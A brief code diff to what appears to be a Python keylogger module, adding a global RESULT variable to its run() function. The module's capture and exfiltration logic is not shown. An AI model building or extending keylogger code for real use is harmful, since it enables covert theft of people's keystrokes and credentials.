@@ -54,6 +54,8 @@ class KeyLogger:
         return True
 
 def run():
+    global RESULT
+    RESULT = ""
     print("[*] In keyloger module.")
 
     while time.thread_time() < 0.1:
